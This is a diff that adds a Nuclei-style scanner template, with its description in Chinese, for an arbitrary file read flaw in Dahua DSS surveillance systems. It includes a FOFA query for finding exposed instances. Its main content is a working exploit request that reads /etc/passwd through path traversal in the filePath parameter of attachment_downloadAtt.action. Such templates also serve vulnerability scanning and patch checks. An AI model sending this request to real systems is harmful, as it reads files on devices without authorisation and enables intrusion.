@@ -1,0 +1,31 @@
+id: poc-lu8hz02fp9hnf9vh
+info:
+  name: 大华DSS数字监控系统attachment_downloadAtt.action任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lu8hz02fp9hnf9vh'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lu8hz02fp9hnf9vh
+    fofa: app="dahua-DSS"
+http:
+- raw:
+  - 'GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
